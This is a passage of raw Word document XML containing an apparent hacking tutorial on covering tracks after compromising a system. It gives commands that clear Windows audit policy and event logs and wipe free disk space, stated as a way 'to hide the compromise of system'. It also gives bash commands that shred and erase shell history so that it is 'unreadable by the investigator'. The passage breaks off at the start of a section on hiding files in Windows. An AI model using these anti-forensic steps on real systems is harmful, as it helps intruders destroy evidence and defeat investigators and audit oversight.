      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">logon”/success”enable/failure:enable</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000023D">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000023E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">auditpol/clear/y</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000023F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000240">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">auditpol/get/category:*</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000241">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000242">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW THE SYSTEM LOGS WILL BE CLEARED TO HIDE THE COMPROMISE OF SYSTEM:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000243">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000244">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">STEP2:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000245">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000246">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">In order to hide the system logs we can use:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000247">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000248">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Go to command prompt&gt;&gt;&gt;run as administrator</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000249">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000024A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Type the command : wevtutil el</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000024B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Then all the event logs will show up</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000024C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Then type the command: </w:t>
      </w:r>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">wevtutil cl system</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000024D">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000024E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">All the event logs will be cleared, also we can type</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000024F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">cipher  /w:C:</w:t>
      </w:r>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> AND START CLEARING THE SYSTEM LOGS.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000250">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000251">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000252">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW WE CAN USE LINUX BASH METHODS TO DELETE ANY HISTORY LOGS AND ALSO MAKE HISTORY FILES</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000253">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">UNREADABLE BY THE INVESTIGATOR:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000254">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000255">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">1. Type export HISTSIZE=0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000256">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">2. history -c</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000257">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">3. history -w</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000258">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">4. shred ~/.bash_history</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000259">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">5. more ~/.bash_history</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000025A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">6. shred ~/.bash_history &amp;&amp; cat /dev/null &gt; bash_history &amp;&amp; history -c &amp;&amp; exit</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000025B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000025C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000025D">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">HOW TO HIDE FILES AND ARTIFACTS IN WINDOWS MACHINE:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000025E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000025F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Go to your cmd</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000260">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Go to desktop and create a dir called “TEST”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000261">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000262">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">mkdir TEST</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000263">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000264">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we will need to type dir to see that the TEST directory is showing up….</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000265">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000266">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
